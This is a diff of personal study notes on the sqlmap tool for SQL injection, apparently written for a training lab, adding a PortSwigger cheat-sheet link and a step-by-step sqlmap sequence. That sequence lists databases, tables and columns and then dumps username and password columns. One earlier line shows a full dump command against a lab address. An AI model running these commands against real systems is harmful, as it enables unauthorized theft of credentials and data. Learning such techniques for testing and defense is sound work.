@@ -1,7 +1,7 @@
 #SQLi #SQLmap #CWES 
 
 doc: https://github.com/sqlmapproject/sqlmap/wiki/Usage 
-
+Portswigger sqli cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet 
 #### Types of sqli variants it can find:
 - `B`: Boolean-based blind
 Look at the server response, and differentiating true and false. Could be differences in raw content, http code, page title, or something else. 
@@ -69,6 +69,22 @@ Could also just have drop it like this to dump all tables:
 ```
 sqlmap -u 'http://154.57.164.77:31988/case2.php' --data 'id=1' --batch --dump
 ```
+
+A more clean way to dump data with sqlmap:
+```
+# 1. Find DBs
+sqlmap -u "URL" -p PARAM --dbs
+
+# 2. Find tables
+sqlmap -u "URL" -p PARAM -D DB --tables
+
+# 3. Find columns
+sqlmap -u "URL" -p PARAM -D DB -T TABLE --columns
+
+# 4. Dump interesting columns
+sqlmap -u "URL" -p PARAM -D DB -T TABLE -C username,password --dump
+```
+
 
 
 PRO TIP:
